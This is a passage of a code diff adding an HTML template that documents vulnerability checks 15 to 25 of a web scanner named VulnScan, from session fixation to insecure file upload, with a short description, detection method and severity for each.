+                <div id="collapse15" class="accordion-collapse collapse" aria-labelledby="heading15">
+                    <div class="accordion-body">
+                        <p><strong>Description:</strong> Exposure of sensitive information that can be used by attackers to further exploit the system.</p>
+                        <p><strong>Detection:</strong> VulnScan looks for debug messages, stack traces, or other sensitive data in responses.</p>
+                        <p><strong>Impact:</strong> Medium. Can aid attackers in crafting more effective attacks.</p>
+                    </div>
+                </div>
+            </div>
+            <!-- 16. Session Fixation -->
+            <div class="accordion-item">
+                <h2 class="accordion-header" id="heading16">
+                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapse16" aria-expanded="false" aria-controls="collapse16">
+                        16. Session Fixation <span class="badge severity-high">High</span>
+                    </button>
+                </h2>
+                <div id="collapse16" class="accordion-collapse collapse" aria-labelledby="heading16">
+                    <div class="accordion-body">
+                        <p><strong>Description:</strong> Allows an attacker to hijack a valid user session by fixing the session ID before the user logs in.</p>
+                        <p><strong>Detection:</strong> VulnScan attempts to set a session ID and checks if it remains the same after login.</p>
+                        <p><strong>Impact:</strong> High. Can lead to unauthorized access to user accounts.</p>
+                    </div>
+                </div>
+            </div>
+            <!-- 17. Missing Security Headers -->
+            <div class="accordion-item">
+                <h2 class="accordion-header" id="heading17">
+                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapse17" aria-expanded="false" aria-controls="collapse17">
+                        17. Missing Security Headers <span class="badge severity-low">Low</span>
+                    </button>
+                </h2>
+                <div id="collapse17" class="accordion-collapse collapse" aria-labelledby="heading17">
+                    <div class="accordion-body">
+                        <p><strong>Description:</strong> Security headers protect against attacks like XSS, clickjacking, etc.</p>
+                        <p><strong>Detection:</strong> VulnScan checks for headers like <code>Strict-Transport-Security</code>, <code>X-Content-Type-Options</code>, etc.</p>
+                        <p><strong>Impact:</strong> Low. Lack of these headers increases risk but is not a vulnerability itself.</p>
+                        </div>
+                </div>
+            </div>
+            <!-- 18. Weak Password Policies -->
+            <div class="accordion-item">
+                <h2 class="accordion-header" id="heading18">
+                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapse18" aria-expanded="false" aria-controls="collapse18">
+                        18. Weak Password Policies <span class="badge severity-medium">Medium</span>
+                    </button>
+                </h2>
+                <div id="collapse18" class="accordion-collapse collapse" aria-labelledby="heading18">
+                    <div class="accordion-body">
+                        <p><strong>Description:</strong> Allows users to set weak passwords, increasing the risk of account compromise.</p>
+                        <p><strong>Detection:</strong> VulnScan attempts to register accounts using common weak passwords.</p>
+                        <p><strong>Impact:</strong> Medium. Can lead to unauthorized access if passwords are guessed.</p>
+                    </div>
+                </div>
+            </div>
+            <!-- 19. Unvalidated Redirects -->
+            <div class="accordion-item">
+                <h2 class="accordion-header" id="heading19">
+                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapse19" aria-expanded="false" aria-controls="collapse19">
+                        19. Unvalidated Redirects <span class="badge severity-medium">Medium</span>
+                    </button>
+                </h2>
+                <div id="collapse19" class="accordion-collapse collapse" aria-labelledby="heading19">
+                    <div class="accordion-body">
+                        <p><strong>Description:</strong> Occurs when redirects are performed based on unvalidated user input.</p>
+                        <p><strong>Detection:</strong> VulnScan injects URLs into redirect parameters to see if unvalidated redirection occurs.</p>
+                        <p><strong>Impact:</strong> Medium. Can be exploited for phishing attacks.</p>
+                    </div>
+                </div>
+            </div>
+            <!-- 20. Path Traversal -->
+            <div class="accordion-item">
+                <h2 class="accordion-header" id="heading20">
+                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapse20" aria-expanded="false" aria-controls="collapse20">
+                        20. Path Traversal <span class="badge severity-high">High</span>
+                    </button>
+                </h2>
+                <div id="collapse20" class="accordion-collapse collapse" aria-labelledby="heading20">
+                    <div class="accordion-body">
+                        <p><strong>Description:</strong> Allows attackers to access files and directories that are stored outside the web root folder.</p>
+                        <p><strong>Detection:</strong> VulnScan tries various traversal sequences to access sensitive files.</p>
+                        <p><strong>Impact:</strong> High. May lead to exposure of critical system files.</p>
+                    </div>
+                </div>
+            </div>
+            <!-- 21. Mass Assignment -->
+            <div class="accordion-item">
+                <h2 class="accordion-header" id="heading21">
+                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapse21" aria-expanded="false" aria-controls="collapse21">
+                        21. Mass Assignment <span class="badge severity-high">High</span>
+                    </button>
+                </h2>
+                <div id="collapse21" class="accordion-collapse collapse" aria-labelledby="heading21">
+                    <div class="accordion-body">
+                        <p><strong>Description:</strong> Occurs when user-provided data is bound to model attributes without proper filtering.</p>
+                        <p><strong>Detection:</strong> VulnScan attempts to submit additional parameters to modify unintended data.</p>
+                        <p><strong>Impact:</strong> High. Can lead to unauthorized data modification.</p>
+                    </div>
+                </div>
+            </div>
+            <!-- 22. Insecure Direct Object References (IDOR) -->
+            <div class="accordion-item">
+                <h2 class="accordion-header" id="heading22">
+                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapse22" aria-expanded="false" aria-controls="collapse22">
+                        22. Insecure Direct Object References (IDOR) <span class="badge severity-high">High</span>
+                    </button>
+                </h2>
+                <div id="collapse22" class="accordion-collapse collapse" aria-labelledby="heading22">
+                    <div class="accordion-body">
+                        <p><strong>Description:</strong> Occurs when an application exposes a reference to an internal implementation object.</p>
+                        <p><strong>Detection:</strong> VulnScan attempts to access resources by manipulating identifiers.</p>
+                        <p><strong>Impact:</strong> High. Can lead to unauthorized access to data.</p>
+                    </div>
+                </div>
+            </div>
+            <!-- 23. Unencrypted Sensitive Cookies -->
+            <div class="accordion-item">
+                <h2 class="accordion-header" id="heading23">
+                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapse23" aria-expanded="false" aria-controls="collapse23">
+                        23. Unencrypted Sensitive Cookies <span class="badge severity-medium">Medium</span>
+                    </button>
+                </h2>
+                <div id="collapse23" class="accordion-collapse collapse" aria-labelledby="heading23">
+                    <div class="accordion-body">
+                        <p><strong>Description:</strong> Sensitive cookies without proper flags can be intercepted or accessed via scripts.</p>
+                        <p><strong>Detection:</strong> VulnScan checks for cookies lacking <code>Secure</code> and <code>HttpOnly</code> flags.</p>
+                        <p><strong>Impact:</strong> Medium. Can lead to session hijacking.</p>
+                    </div>
+                </div>
+            </div>
+            <!-- 24. No Rate Limiting -->
+            <div class="accordion-item">
+                <h2 class="accordion-header" id="heading24">
+                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapse24" aria-expanded="false" aria-controls="collapse24">
+                        24. No Rate Limiting <span class="badge severity-high">High</span>
+                    </button>
+                </h2>
+                <div id="collapse24" class="accordion-collapse collapse" aria-labelledby="heading24">
+                    <div class="accordion-body">
+                        <p><strong>Description:</strong> Absence of rate limiting can allow attackers to perform brute-force attacks.</p>
+                        <p><strong>Detection:</strong> VulnScan attempts multiple rapid requests to see if rate limiting is enforced.</p>
+                        <p><strong>Impact:</strong> High. Can lead to account compromise.</p>
+                    </div>
+                </div>
+            </div>
+            <!-- 25. Insecure File Upload -->
+            <div class="accordion-item">
+                <h2 class="accordion-header" id="heading25">
+                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapse25" aria-expanded="false" aria-controls="collapse25">
+                        25. Insecure File Upload <span class="badge severity-high">High</span>
+                    </button>
+                </h2>
+                <div id="collapse25" class="accordion-collapse collapse" aria-labelledby="heading25">
+                    <div class="accordion-body">
+                        <p><strong>Description:</strong> Allows attackers to upload malicious files, potentially leading to code execution.</p>
+                        <p><strong>Detection:</strong> VulnScan tries to upload files with executable extensions.</p>
+                        <p><strong>Impact:</strong> High. Can lead to server compromise.</p>
+                    </div>
+                </div>
+            </div>
+                        </div>
+
+        <div class="text-center mt-5">
+            <a href="/" class="btn btn-primary"><i class="fas fa-home"></i> Back to Home</a>
+                        </div>
+    </div>
+    <!-- Bootstrap JS and dependencies -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <!-- Optional JavaScript for interactive components -->
+</body>
+</html>
+{% endblock %}
